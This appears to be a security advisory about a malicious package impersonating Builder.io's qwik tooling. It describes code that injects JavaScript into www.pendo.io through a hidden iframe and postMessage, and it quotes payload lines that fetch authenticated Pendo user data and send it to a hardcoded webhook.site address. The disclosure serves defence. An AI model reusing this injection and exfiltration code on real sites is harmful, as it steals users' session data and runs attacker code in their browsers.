summary: Weaponized PoC impersonating @builder.io/qwik with hardcoded exfiltration webhook
details: Package name impersonates Builder.io's official qwik tooling and is staged for delivery via a CDN path-traversal exploit against qwik-playground.builder.io. On import, index.js creates a hidden iframe pointing at www.pendo.io and uses postMessage with type `builder.patchUpdates` to inject attacker-controlled JavaScript into hardcoded Builder.io block IDs. The injected payload (patched into `/bindings/show`) calls `fetch('https://novus-api.pendo.io/pendo/user', {method:'POST', credentials:'include',...})` and beacons the authenticated response via `new Image().src` to a hardcoded `https://webhook.site/d4d74967-cd7f-4b43-86f0-944e71ac7c97` endpoint controlled by the package author. Any consumer who imports or bundles this package and loads it in a browser context silently relays end-user Pendo session data to that webhook and executes attacker-controlled JS in the www.pendo.io origin via the postMessage→Function() sink. The combination of name-impersonation, hardcoded third-party exfil endpoint, and cross-origin code injection makes this an active supply-chain weapon, not a benign proof-of-concept.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
